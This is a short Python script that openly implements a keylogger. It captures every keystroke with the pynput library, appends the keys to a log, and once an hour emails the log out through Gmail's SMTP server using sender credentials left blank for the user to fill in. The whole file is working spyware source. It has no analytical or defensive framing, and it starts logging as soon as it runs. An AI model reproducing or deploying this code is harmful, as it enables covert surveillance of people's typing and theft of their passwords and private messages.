import pynput.keyboard
import smtplib
import threading


class Keylogger:

    def __init__(self):
        self.log = "Keylogger Started!"

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(3600, self.report)
        timer.start()

    @staticmethod
    def send_mail(message):
        sender = " " #YOUR EMAIL
        password = " " # YOUR PASSWORD
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        msg = message
        server.login(sender, password)
        server.sendmail(sender, sender, msg)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


my_keylogger = Keylogger()
my_keylogger.start()
